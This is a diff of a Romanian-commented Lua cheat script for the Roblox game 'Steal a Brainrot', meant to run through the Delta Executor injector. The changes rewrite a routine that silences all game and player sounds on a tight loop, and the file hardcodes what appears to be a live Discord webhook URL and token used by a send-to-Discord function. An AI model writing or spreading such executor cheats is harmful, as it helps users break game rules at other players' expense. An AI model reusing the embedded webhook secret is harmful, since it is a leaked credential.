@@ -1,6 +1,5 @@
 -- Script pentru Delta - Steal a Brainrot (Loader PERMANENT + Discord)
--- Compatibil cu Delta Executor
--- OPRESTE TOATE SUNETELE (INCLUSIV PAȘI ȘI CLONE)
+-- BLOCARE TOTALĂ A SUNETELOR
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -8,6 +7,7 @@ local LocalPlayer = Players.LocalPlayer
 local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
+local SoundService = game:GetService("SoundService")
 
 -- ===== CONFIGURARE =====
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
@@ -27,83 +27,62 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== OPREȘTE TOATE SUNETELE =====
+-- ===== BLOCARE TOTALĂ A SUNETELOR =====
 local function muteAllSounds()
-    local count = 0
+    print("🔇 Oprește toate sunetele...")
     
-    -- 1. Oprește sunetele din toate serviciile
-    local services = {
-        Workspace,
-        game:GetService("Lighting"),
-        game:GetService("ReplicatedStorage"),
-        game:GetService("Players").LocalPlayer.PlayerGui,
-        game:GetService("StarterGui"),
-        game:GetService("SoundService"),
-        game:GetService("Players")
-    }
+    -- 1. Setează volumul global la 0
+    pcall(function()
+        SoundService.Volume = 0
+    end)
     
-    for _, service in pairs(services) do
-        pcall(function()
-            for _, sound in pairs(service:GetDescendants()) do
-                if sound:IsA("Sound") then
-                    sound.Volume = 0
-                    sound:Stop()
-                    count = count + 1
-                end
-            end
-        end)
-    end
-    
-    -- 2. Oprește sunetele de pași, clone, teleport etc.
+    -- 2. Oprește TOATE sunetele din TOT jocul
     pcall(function()
         for _, sound in pairs(game:GetDescendants()) do
-            if sound:IsA("Sound") and (
-                sound.Name:lower():find("foot") or 
-                sound.Name:lower():find("step") or 
-                sound.Name:lower():find("walk") or 
-                sound.Name:lower():find("run") or
-                sound.Name:lower():find("clone") or
-                sound.Name:lower():find("teleport") or
-                sound.Name:lower():find("spawn") or
-                sound.Name:lower():find("jump")
-            ) then
+            if sound:IsA("Sound") then
                 sound.Volume = 0
                 sound:Stop()
-                count = count + 1
+                sound.Playing = false
             end
         end
     end)
     
     -- 3. Oprește sunetele din fiecare jucător
     pcall(function()
-        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+        for _, player in pairs(Players:GetPlayers()) do
             if player.Character then
                 for _, sound in pairs(player.Character:GetDescendants()) do
                     if sound:IsA("Sound") then
                         sound.Volume = 0
                         sound:Stop()
-                        count = count + 1
+                        sound.Playing = false
                     end
                 end
             end
         end
     end)
     
-    -- 4. Blochează sunetele noi care apar (loop)
+    -- 4. BLOCEAZĂ ORICE SUNET NOU (loop la fiecare 0.1 secunde)
     spawn(function()
         while true do
-            task.wait(0.5)
-            for _, sound in pairs(game:GetDescendants()) do
-                if sound:IsA("Sound") and sound.Volume > 0 then
-                    sound.Volume = 0
-                    sound:Stop()
+            task.wait(0.1)
+            pcall(function()
+                -- Setează volumul global la 0 din nou
+                SoundService.Volume = 0
+                
+                -- Oprește orice sunet nou apărut
+                for _, sound in pairs(game:GetDescendants()) do
+                    if sound:IsA("Sound") and (sound.Volume > 0 or sound.Playing == true) then
+                        sound.Volume = 0
+                        sound:Stop()
+                        sound.Playing = false
+                    end
                 end
-            end
+            end)
         end
     end)
     
-    print("✅ " .. count .. " sunete oprite (inclusiv pași și clone)!")
-    return count
+    print("✅ Toate sunetele au fost blocate!")
 end
 
 -- ===== ASCUNDE BRAINROT-URILE =====
